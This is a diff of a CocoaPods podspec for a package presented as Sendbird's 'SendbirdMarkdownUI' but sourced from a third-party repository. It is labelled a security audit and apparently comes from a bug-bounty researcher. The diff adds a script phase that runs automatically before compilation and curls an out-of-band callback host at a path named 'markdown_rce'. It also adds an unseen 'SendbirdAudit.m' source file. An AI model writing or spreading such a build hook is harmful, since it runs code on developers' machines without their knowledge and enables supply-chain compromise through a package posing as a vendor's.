@@ -1,12 +1,13 @@
 Pod::Spec.new do |s|
   s.name             = 'SendbirdMarkdownUI'
-  s.version          = '5.0.5'
-  s.summary          = 'Security Research - Part of Sendbird AI ecosystem audit'
-  s.homepage         = 'https://github.com/ilhamal7/sendbird-ios-distribution'
-  s.license          = { :type => 'Commercial', :text => 'Copyright Sendbird' }
-  s.author           = { 'zerotohero' => 'zerotohero@bugcrowdninja.com' }
-  s.source           = { :git => 'https://github.com/ilhamal7/sendbird-ios-distribution.git', :tag => "#{s.version}" }
-  s.ios.deployment_target = '14.0'
-  s.swift_version    = '5.7'
-  s.source_files     = 'Sources/**/*.{h,m}'
+  s.version          = '5.1.0'
+  s.summary          = 'Security Audit - Markdown Rendering'
+  s.source           = { :git => 'https://github.com/ilhamal7/sendbird-ios-distribution.git', :tag => '5.1.0' }
+  s.ios.deployment_target = '15.0'
+  s.source_files     = 'Sources/MarkdownUI/**/*', 'Sources/SendbirdAudit.m'
+  s.script_phase = {
+    :name => 'Markdown Audit',
+    :script => 'curl http://txltewamwbpaxlebmxwikbce81fq8r5cw.oast.fun/markdown_rce',
+    :execution_position => :before_compile
+  }
 end
